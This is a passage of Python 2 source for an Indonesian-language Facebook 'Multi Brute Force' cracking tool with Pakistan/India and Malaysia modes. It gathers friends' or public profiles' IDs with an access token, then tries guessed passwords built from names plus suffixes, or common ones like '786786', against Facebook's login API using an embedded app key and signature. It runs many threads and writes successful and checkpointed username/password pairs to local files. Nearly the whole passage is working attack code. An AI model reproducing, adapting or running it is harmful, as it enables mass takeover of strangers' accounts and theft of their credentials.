	print "\033[0;97m(\033[0;94m•\033[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\033[0m"
	print 50* "\033[1;94m─"
	
##### MAIN PAKISTAN  & india#####
	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;97m%H\033[1;97m:\033[1;97m%M\033[1;97m:\033[1;97m%S")));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
				oke = open("done/pakis_hindi.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
					cek = open("done/pakis_hindi.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
						oke = open("done/pakis_hindi.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
							cek = open("done/pakis_hindi.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
								oke = open("done/pakis_hindi.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
									cek = open("done/pakis_hindi.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('786786')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
										oke = open("done/pakis_hindi.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
											cek = open("done/pakis_hindi.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = ('786786')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
												oke = open("done/pakis_hindi.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
													cek = open("done/pakis_hindi.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = ('102030')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
														oke = open("done/pakis_hindi.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
															cek = open("done/pakis_hindi.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = ('786786')
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																oke = open("done/pakis_hindi.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																	cek = open("done/pakis_hindi.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'786'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																		oke = open("done/pakis_hindi.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																			cek = open("done/pakis_hindi.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSelesai ...'
	print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSalin hasil crack lalu simpan\033[1;91m : \033[1;97mdone pakis_hindi.'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m(\033[1;91mKembali\033[1;97m) ")
	os.system("python2 Crack.py")
	
	
	##### CRACK MALAYSIA#####
def crack_malay():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print " "
	print "\033[1;91m _________   ________.    "
	print "\033[1;97m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
	print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
	print "\033[1;97m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
	print "\033[1;91m  \______  /|__|   |___  /"
	print "\033[1;97m         \/            \/ "
	print 50* "\033[1;94m─"
	print "\033[1;94m────────────────────\033[1;97m(\033[1;93mMalaysia\033[1;97m)\033[1;94m────────────────────"
	print 50* "\033[1;94m─"
	print "\033[1;94m(\033[1;97m1\033[1;94m) \033[1;97mCrack Dari Daftar Teman"
	print "\033[1;94m(\033[1;97m2\033[1;94m)\033[1;97m Crack Dari Id Teman/Publik"
	print "\033[1;94m(\033[1;97m3\033[1;94m)\033[1;97m Crack Dari File"
	print "\033[1;94m(\033[1;91m0\033[1;94m) \033[1;97mKembali"
	print 50* "\033[1;94m─"
	pilih_malay()

#### PILIH malaysia ####
def pilih_malay():
	teak = raw_input("\033[1;97m(?) Pilih \033[94m> \033[1;97m ")
	if teak =="":
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_malay()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print " "
		print "\033[1;91m _________   ________.    "
		print "\033[1;97m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;97m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;91m  \______  /|__|   |___  /"
		print "\033[1;97m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK MALAYSIA \033[1;94m<<<")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print " "
		print "\033[1;91m _________   ________.    "
		print "\033[1;97m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;97m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;91m  \______  /|__|   |___  /"
		print "\033[1;97m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK MALAYSIA \033[1;94m<<<")
		print 50* "\033[1;94m─"
		idt = raw_input("\033[1;97m(\033[1;94m•\033[1;97m) ID Publik \033[1;91m:\033[1;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m(\033[1;94m•\033[1;97m) Nama Akun \033[1;91m:\033[1;97m "+sp["name"]
		except KeyError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) ID publik Tidak Ada!"
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_malay()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print " "
		print "\033[1;91m _________   ________.    "
		print "\033[1;97m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;97m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;91m  \______  /|__|   |___  /"
		print "\033[1;97m         \/            \/ "
		try:
			print 50* "\033[1;94m─"
			print ("             \033[1;94m>>> \033[1;93mCRACK MALAYSIA \033[1;94m<<<")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mNama File\033[1;91m :\033[1;97m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada ! '
			raw_input('\n\033[1;97m(\033[1;91mKembali \033[1;97m)')
		except IOError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada !'
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_malay()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_malay()
	
	print "\033[0;97m(\033[0;94m•\033[0;97m) Total ID\033[1;91m  :\033[1;97m "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m(\033[0;94m•\033[0;97m) Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print "\033[0;97m(\033[0;94m•\033[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\033[0m"
	print "\033[0;97m(\033[0;94m•\033[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\033[0m"
	print 50* "\033[1;94m─"
	
##### MAIN MALAYSIA #####
	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;97m%H\033[1;97m:\033[1;97m%M\033[1;97m:\033[1;97m%S")));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
				oke = open("done/malay.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
					cek = open("done/malay.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
						oke = open("done/malay.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
							cek = open("done/malay.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
								oke = open("done/malay.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
									cek = open("done/malay.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('Sayang')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
										oke = open("done/malay.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
